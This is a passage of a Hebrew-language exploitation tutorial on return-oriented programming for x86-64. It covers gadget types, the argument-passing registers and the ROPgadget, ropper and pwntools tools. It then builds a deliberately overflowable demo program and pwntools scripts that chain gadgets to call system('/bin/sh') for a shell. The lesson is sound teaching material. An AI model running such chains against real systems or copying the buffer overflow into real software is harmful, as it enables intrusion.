+<li>הגאדג'ט מבצע <code>pop rsi</code> ושולף את <code>0x0</code> לתוך <code>rsi</code>.</li>
+<li>ה-<code>ret</code> שולף את הכתובת של <code>some_function</code> וקופץ אליה, כשכבר <code>rdi=0x1337</code> ו-<code>rsi=0</code>.</li>
+</ol>
+<p>שימו לב לתובנה המרכזית: כל פעם ש-<code>ret</code> רץ, הוא "צורך" פריט אחד מהמחסנית ומעביר את השליטה קדימה. פריטים שהם כתובות גאדג'טים הם ה"הוראות" שלנו, ופריטים שהם ערכים הם ה"נתונים" ש-<code>pop</code> שולף. אנחנו מתכנתים ישירות על המחסנית.</p>
+<p>וזה מוביל לנקודה עמוקה: ROP הוא טיורינג-שלם. עם הסט הנכון של גאדג'טים אפשר לבנות כל חישוב: להכניס ערכים לאוגרים (<code>pop reg</code>), לכתוב לזיכרון (<code>mov [reg], reg</code>), לקרוא מזיכרון, לחבר ולחסר (<code>add</code>, <code>sub</code>), אפילו להסתעף בתנאי. בפועל, לרוב לא נבנה מחשבון שלם - נבנה בדיוק את מה שצריך כדי לקרוא לפונקציה שתיתן לנו shell. אבל חשוב להבין שהכוח שם.</p>
+<h2 id="_1">קטלוג הגאדג'טים השימושיים<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>בשלב הזה כדאי להכיר את סוגי הגאדג'טים שתחפשו שוב ושוב. הטבלה מסכמת את הנפוצים ואת מה שהם נותנים:</p>
+<table>
+<thead>
+<tr>
+<th>הגאדג'ט</th>
+<th>מה הוא עושה</th>
+<th>למה צריך אותו</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>pop rdi ; ret</code></td>
+<td>טוען ערך מהמחסנית ל-<code>rdi</code></td>
+<td>ארגומנט ראשון לפונקציה ב-64 ביט</td>
+</tr>
+<tr>
+<td><code>pop rsi ; ret</code></td>
+<td>טוען ערך ל-<code>rsi</code></td>
+<td>ארגומנט שני (לרוב מופיע כ-<code>pop rsi ; pop r15 ; ret</code>)</td>
+</tr>
+<tr>
+<td><code>pop rdx ; ret</code></td>
+<td>טוען ערך ל-<code>rdx</code></td>
+<td>ארגומנט שלישי (למשל אורך ב-<code>read</code>)</td>
+</tr>
+<tr>
+<td><code>pop rax ; ret</code></td>
+<td>טוען ערך ל-<code>rax</code></td>
+<td>מספר ה-syscall, או ערך לכתיבה</td>
+</tr>
+<tr>
+<td><code>mov [rdi], rax ; ret</code></td>
+<td>כותב את <code>rax</code> לכתובת שב-<code>rdi</code></td>
+<td>כתיבה שרירותית לזיכרון - write-what-where</td>
+</tr>
+<tr>
+<td><code>syscall ; ret</code></td>
+<td>מבצע קריאת מערכת</td>
+<td>לקרוא ל-execve ישירות בלי libc</td>
+</tr>
+<tr>
+<td><code>leave ; ret</code></td>
+<td><code>mov rsp, rbp ; pop rbp</code></td>
+<td>היפוך מחסנית - stack pivot (פרק 6)</td>
+</tr>
+<tr>
+<td><code>xchg rax, rdi ; ret</code></td>
+<td>מחליף בין אוגרים</td>
+<td>גישור כשאין <code>pop</code> ישיר לאוגר שצריך</td>
+</tr>
+<tr>
+<td><code>ret</code></td>
+<td>לא עושה כלום, רק מקדם את <code>rsp</code> ב-8</td>
+<td>alignment מחסנית ל-16 בתים</td>
+</tr>
+</tbody>
+</table>
+<p>הגאדג'ט האחרון, <code>ret</code> בודד, נראה חסר תועלת אבל הוא כוכב חשוב - נחזור אליו בסעיף הalignment.</p>
+<h2 id="-64-">העברת ארגומנטים ב-64 ביט - תזכורת ממוקדת<a class="headerlink" href="#-64-" title="Permanent link">&para;</a></h2>
+<p>כבר עשינו את זה ב-2.3, אבל נחזק כי זה הלב של הכל. קונבנציית הקריאה של System V ב-64 ביט מעבירה את ששת הארגומנטים הראשונים באוגרים, בסדר הזה:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>argument 1 -&gt; rdi
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>argument 2 -&gt; rsi
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>argument 3 -&gt; rdx
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>argument 4 -&gt; rcx
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>argument 5 -&gt; r8
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>argument 6 -&gt; r9
+</code></pre></div>
+<p>כדי לקרוא ל-<code>func(a, b, c)</code> אנחנו צריכים ש-<code>rdi=a</code>, <code>rsi=b</code>, <code>rdx=c</code> ברגע הקפיצה ל-<code>func</code>. אנחנו שולטים במחסנית ולא באוגרים, ולכן משתמשים בגאדג'טים <code>pop rdi ; ret</code>, <code>pop rsi ; ... ; ret</code>, <code>pop rdx ; ret</code> כדי לטעון כל אוגר בתורו. זו בדיוק הסיבה שאנחנו רודפים אחרי גאדג'טים כאלה. ב-32 ביט, לשם ההשוואה, הארגומנטים עוברים על המחסנית ולכן שם כמעט לא צריך גאדג'טים לקריאה בודדת - מספיק לסדר <code>[func] [return address] [arg1] [arg2]</code>, כמו שראינו ב-2.3.</p>
+<h2 id="-_1">מציאת גאדג'טים - הכלים<a class="headerlink" href="#-_1" title="Permanent link">&para;</a></h2>
+<p>יש שלושה כלים מרכזיים שתשתמשו בהם. הראשון, <code>ROPgadget</code>, סורק את הבינארי ומדפיס את כל הגאדג'טים:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># all gadgets</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>rop_demo
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># search for a specific gadget</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>rop_demo<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;pop rdi ; ret&#39;</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="c1"># 0x0000000000401256 : pop rdi ; ret</span>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="c1"># filter by instruction types</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>rop_demo<span class="w"> </span>--only<span class="w"> </span><span class="s1">&#39;pop|ret&#39;</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="c1"># search for a string in the binary (very useful for /bin/sh)</span>
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>rop_demo<span class="w"> </span>--string<span class="w"> </span><span class="s1">&#39;/bin/sh&#39;</span>
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="c1"># 0x00402008 : /bin/sh</span>
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="c1"># attempt to auto-build an execve chain (works well for static binaries)</span>
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>rop_demo<span class="w"> </span>--ropchain
+</code></pre></div>
+<p>הכלי השני, <code>ropper</code>, דומה אבל עם חיפוש חכם יותר שמבין תבניות:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># search with exact syntax</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>ropper<span class="w"> </span>--file<span class="w"> </span>rop_demo<span class="w"> </span>--search<span class="w"> </span><span class="s2">&quot;pop rdi; ret&quot;</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># pattern with a wildcard - % is &quot;anything&quot;</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>ropper<span class="w"> </span>--file<span class="w"> </span>rop_demo<span class="w"> </span>--search<span class="w"> </span><span class="s2">&quot;pop rdi; %&quot;</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>ropper<span class="w"> </span>--file<span class="w"> </span>rop_demo<span class="w"> </span>--search<span class="w"> </span><span class="s2">&quot;mov [%], %&quot;</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="c1"># search for a string</span>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>ropper<span class="w"> </span>--file<span class="w"> </span>rop_demo<span class="w"> </span>--string<span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span>
+</code></pre></div>
+<p>בפועל, <code>ROPgadget</code> ו-<code>ropper</code> משלימים זה את זה, ולפעמים גאדג'ט שאחד לא מראה יפה, השני כן. שווה להכיר את שניהם.</p>
+<p>הכלי השלישי, והכי נוח בזרימת עבודה אמיתית, הוא אובייקט ה-<code>ROP</code> של <code>pwntools</code>. הוא לא רק מוצא גאדג'טים, הוא בונה את הchain בשבילכם:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./rop_demo&#39;</span><span class="p">)</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="c1"># find a gadget by description</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;pop rdi&#39;</span><span class="p">,</span> <span class="s1">&#39;ret&#39;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;pop rdi ; ret @ </span><span class="si">%#x</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">pop_rdi</span><span class="p">)</span>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="c1"># or simply ask &quot;load this value into a register&quot; and pwntools finds the gadget itself</span>
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="n">rop</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x1337</span>
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>
+<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="c1"># or call a function with arguments</span>
+<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">,</span> <span class="p">[</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]])</span>
+<a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>
+<a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a><span class="c1"># print the chain in readable form</span>
+<a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a><span class="nb">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+<a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>
+<a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a><span class="c1"># and get the bytes ready to send</span>
+<a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()</span>
+</code></pre></div>
+<p>ה-<code>rop.dump()</code> הוא חבר קרוב: הוא מדפיס לכם בדיוק איזה גאדג'ט בכל סלוט ומה הערך שנטען, וזה חוסך שעות של דיבוג.</p>
+<h2 id="_2">הבינארי לדוגמה<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>לאורך השיעור נעבוד עם הבינארי הבא. שימו לב שהוא כולל קריאה ל-<code>system</code> ומחרוזת <code>/bin/sh</code>, כדי שגם ה-<code>system@plt</code> וגם המחרוזת יהיו קיימים בתוך הבינארי בכתובות קבועות:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1">// rop_demo.c</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="c1">// this call ensures system gets into the PLT and that the string /bin/sh is in the binary.</span>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="c1">// it is not called in the normal flow.</span>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="kt">void</span><span class="w"> </span><span class="nf">never_called</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="p">}</span>
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;send payload:&quot;</span><span class="p">);</span>
+<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">256</span><span class="p">);</span><span class="w">   </span><span class="c1">// overflow: 256 bytes into a 64-byte buffer</span>
+<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="p">}</span>
+<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>
+<a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a><span class="w">    </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">_IONBF</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a><span class="w">    </span><span class="n">vuln</span><span class="p">();</span>
+<a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a><span class="p">}</span>
+</code></pre></div>
+<p>נקמפל אותו ל-64 ביט, בלי canary ובלי PIE, כדי לבודד את טכניקת ה-ROP:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>gcc<span class="w"> </span>-fno-stack-protector<span class="w"> </span>-no-pie<span class="w"> </span>-o<span class="w"> </span>rop_demo<span class="w"> </span>rop_demo.c
+</code></pre></div>
+<p>ונבדוק את ההגנות:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>$<span class="w"> </span>checksec<span class="w"> </span>--file<span class="o">=</span>./rop_demo
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>RELRO<span class="w">           </span>STACK<span class="w"> </span>CANARY<span class="w">   </span>NX<span class="w">            </span>PIE
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>Partial<span class="w"> </span>RELRO<span class="w">   </span>No<span class="w"> </span>canary<span class="w">      </span>NX<span class="w"> </span>enabled<span class="w">    </span>No<span class="w"> </span>PIE
+</code></pre></div>
+<p>הנחות ההגנה שלנו: NX פעיל (זו הסיבה שאנחנו עושים ROP במקום shellcode), אין canary (הoverflow עוברת חופשי), ואין PIE (כתובות הקוד, ה-PLT והמחרוזת קבועות בכל הרצה). מכיוון שהכל בchain שלנו יגיע מתוך הבינארי, <code>ret2libc</code> על libc אמיתי עם ASLR פעיל הוא סיפור של השיעור הבא (4.4). כאן אנחנו נשארים בתוך הבינארי, ולכן ASLR של המערכת לא מפריע לנו - ה-ASLR מערבב את libc, המחסנית וה-heap, אבל לא את הקוד של בינארי לא-PIE.</p>
+<h2 id="chain-system-">בניית chain ל-system מתוך הבינארי - ידני<a class="headerlink" href="#chain-system-" title="Permanent link">&para;</a></h2>
+<p>המטרה: לקרוא ל-<code>system("/bin/sh")</code>. ב-64 ביט זה אומר ש-<code>rdi</code> צריך להצביע על המחרוזת <code>"/bin/sh"</code> ברגע הקפיצה ל-<code>system</code>. שני רכיבים נדרשים:</p>
+<ul>
+<li>כתובת הגאדג'ט <code>pop rdi ; ret</code> כדי לטעון את המצביע ל-<code>rdi</code>.</li>
+<li>כתובת המחרוזת <code>"/bin/sh"</code> וכתובת <code>system@plt</code>.</li>
+</ul>
+<p>נמצא הכל:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>$<span class="w"> </span>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>rop_demo<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;pop rdi ; ret&#39;</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>0x0000000000401256<span class="w"> </span>:<span class="w"> </span>pop<span class="w"> </span>rdi<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>$<span class="w"> </span>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>rop_demo<span class="w"> </span>--string<span class="w"> </span><span class="s1">&#39;/bin/sh&#39;</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>0x0000000000402008<span class="w"> </span>:<span class="w"> </span>/bin/sh
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>$<span class="w"> </span>objdump<span class="w"> </span>-d<span class="w"> </span>rop_demo<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;&lt;system@plt&gt;:&#39;</span>
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="m">0000000000401060</span><span class="w"> </span>&lt;system@plt&gt;:
+</code></pre></div>
+<p>עכשיו נסדר את הchain. שימו לב לגאדג'ט <code>ret</code> הבודד בהתחלה - הוא לalignment המחסנית, ומיד נסביר למה:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>low addresses (top of stack)
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>+----------------------------+
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>| padding - 72 bytes         |  &lt;-- fills buf and saved rbp
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>+----------------------------+
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>| ret  (alignment to 16 bytes)|  &lt;-- the ret of vuln jumps here
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>+----------------------------+
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>| pop rdi ; ret              |
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>+----------------------------+
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>| 0x402008  (address of /bin/sh) |  &lt;-- popped into rdi
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>+----------------------------+
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>| system@plt (0x401060)      |  &lt;-- called with rdi -&gt; &quot;/bin/sh&quot;
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>+----------------------------+
+<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>high addresses
+</code></pre></div>
+<p>והקוד:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="ch">#!/usr/bin/env python3</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./rop_demo&#39;</span><span class="p">)</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x401256</span>
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="n">ret</span>     <span class="o">=</span> <span class="mh">0x40101a</span>          <span class="c1"># single ret gadget for alignment</span>
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="n">binsh</span>   <span class="o">=</span> <span class="mh">0x402008</span>
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="n">system</span>  <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>  <span class="c1"># 0x401060</span>
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>
+<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="n">offset</span> <span class="o">=</span> <span class="mi">72</span>
+<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span><span class="n">offset</span><span class="p">:</span> <span class="p">[</span>
+<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a>    <span class="n">ret</span><span class="p">,</span>        <span class="c1"># aligns the stack to 16 bytes</span>
+<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a>    <span class="n">pop_rdi</span><span class="p">,</span>
+<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>    <span class="n">binsh</span><span class="p">,</span>      <span class="c1"># rdi = address of &quot;/bin/sh&quot;</span>
+<a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a>    <span class="n">system</span><span class="p">,</span>     <span class="c1"># calls system(&quot;/bin/sh&quot;)</span>
+<a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a><span class="p">]})</span>
+<a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a>
+<a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./rop_demo&#39;</span><span class="p">)</span>
+<a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;payload:&#39;</span><span class="p">)</span>
+<a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>מריצים, ומקבלים shell. שימו לב שלא צריך לחשב כתובות libc, לא צריך לדלוף כלום, ואין תלות ב-ASLR - הכל בכתובות קבועות בתוך הבינארי.</p>
+<h2 id="rop-">אותו דבר עם אובייקט ROP - הדרך המקצועית<a class="headerlink" href="#rop-" title="Permanent link">&para;</a></h2>
+<p>בפועל לא כותבים כתובות גאדג'ט ביד. נותנים ל-<code>ROP</code> לחפש הכל. שימו לב כמה זה נקי:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="ch">#!/usr/bin/env python3</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./rop_demo&#39;</span><span class="p">)</span>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="n">binsh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>   <span class="c1"># finds the string in the binary</span>
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
